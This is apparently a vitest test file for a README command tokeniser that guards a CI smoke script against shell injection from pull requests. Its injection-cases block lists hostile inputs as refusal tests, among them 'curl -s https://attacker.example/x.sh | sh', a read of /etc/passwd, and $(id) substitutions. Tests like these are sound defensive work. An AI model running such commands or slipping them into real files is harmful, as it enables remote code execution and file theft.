/**
 * The README command tokeniser is the security boundary of `scripts/readme-commands-smoke.mjs`.
 *
 * Role: that gate executes commands lifted out of README.md, and README.md is editable by any pull
 * request including one from a fork. The tokeniser is what stands between an untrusted
 * fence line and `spawnSync`, so it is tested in BOTH directions on purpose: the shapes the README
 * legitimately contains must survive verbatim, and every shell-composition character must refuse.
 *
 * A gate nobody has watched fail proves nothing — the injection cases below are the failure, kept.
 *
 * Caller: `pnpm run test:scripts` (vitest.scripts.config.ts), chained into `pnpm test`.
 */
import { describe, expect, it } from "vitest";

import { tokenizeCommand } from "./readme-command-tokenize.mjs";

/** Assert a command is refused, and return the character that refused it. */
function refusalCharacter(command: string): string {
  const result = tokenizeCommand(command);
  expect(result.ok, `expected "${command}" to be refused`).toBe(false);
  return (result as { character: string }).character;
}

describe("tokenizeCommand — the shapes README.md actually documents", () => {
  it("splits a filtered workspace script into argv", () => {
    expect(tokenizeCommand("pnpm --filter @shellx-motion/cli run cli -- doctor")).toEqual({
      ok: true,
      argv: ["pnpm", "--filter", "@shellx-motion/cli", "run", "cli", "--", "doctor"]
    });
  });

  it("keeps a double-quoted prose argument as ONE argv element, quotes removed", () => {
    const result = tokenizeCommand(
      'pnpm --filter @shellx-motion/cli run cli -- actions find "add a cinematic snow environment"'
    );

    expect(result).toEqual({
      ok: true,
      argv: [
        "pnpm", "--filter", "@shellx-motion/cli", "run", "cli", "--", "actions", "find",
        "add a cinematic snow environment"
      ]
    });
  });

  it("accepts the punctuation real commands carry: flags, paths, dotted ids, underscores", () => {
    expect(tokenizeCommand(
      "pnpm --filter @shellx-motion/debug-server run serve -- --tier render_motion --trusted-local-tier"
    ).ok).toBe(true);
    expect(tokenizeCommand(
      "pnpm --filter @shellx-motion/cli run cli -- validate fixtures/packages/keyframed-lower-third"
    ).ok).toBe(true);
    expect(tokenizeCommand(
      "pnpm --filter @shellx-motion/cli run cli -- actions guide motion.timeline.layer.rich.set"
    ).ok).toBe(true);
  });
});

describe("tokenizeCommand — injection cases", () => {
  it("refuses the exact payload from the security review", () => {
    expect(refusalCharacter("pnpm run typecheck && curl -s https://attacker.example/x.sh | sh")).toBe("&");
  });

  it("refuses the program-name injection that reached the PATH probe", () => {
    // `command -v ${JSON.stringify(program)}` under `shell: true` expanded this. JSON quoting is
    // not shell quoting; the fix is both here and in programOnPath's argument passing.
    expect(refusalCharacter('x"$(id)" doctor')).toBe("$");
  });

  it.each([
    ["chaining with a semicolon", "pnpm run build; id", ";"],
    ["a pipeline", "pnpm run build | sh", "|"],
    ["command substitution with backticks", "pnpm run `id`", "`"],
    ["command substitution with $()", "pnpm run $(id)", "$"],
    ["variable expansion", "pnpm run $EVIL", "$"],
    ["output redirection", "pnpm run build > /etc/x", ">"],
    ["input redirection", "pnpm run build < /etc/passwd", "<"],
    ["a background fork", "pnpm run build & id", "&"],
    ["a glob", "pnpm run build/*", "*"],
    ["home expansion", "pnpm run ~/evil", "~"],
    ["an escape", "pnpm run build\\;id", "\\"],
    ["a comment", "pnpm run build # id", "#"],
    ["cmd.exe variable expansion", "pnpm run %PATH%", "%"],
    ["cmd.exe delayed expansion", "pnpm run !PATH!", "!"],
    ["cmd.exe escaping", "pnpm run build^", "^"],
    ["single quotes, which sh and cmd.exe disagree about", "pnpm run 'a b'", "'"]
  ])("refuses %s", (_label, command, character) => {
    expect(refusalCharacter(command)).toBe(character);
  });

  it("refuses expansion INSIDE a double-quoted span, where a shell still performs it", () => {
    expect(refusalCharacter('pnpm --filter x run y -- find "snow $(id)"')).toBe("$");
    expect(refusalCharacter('pnpm --filter x run y -- find "snow `id`"')).toBe("`");
    expect(refusalCharacter('pnpm --filter x run y -- find "snow %PATH%"')).toBe("%");
  });

  it("refuses an unterminated quote rather than guessing where the argument ends", () => {
    const result = tokenizeCommand('pnpm --filter x run y -- find "unclosed');
    expect(result).toMatchObject({ ok: false, reason: "unterminated double quote" });
  });

  it("refuses an empty command", () => {
    expect(tokenizeCommand("   ")).toMatchObject({ ok: false, reason: "empty command" });
  });
});
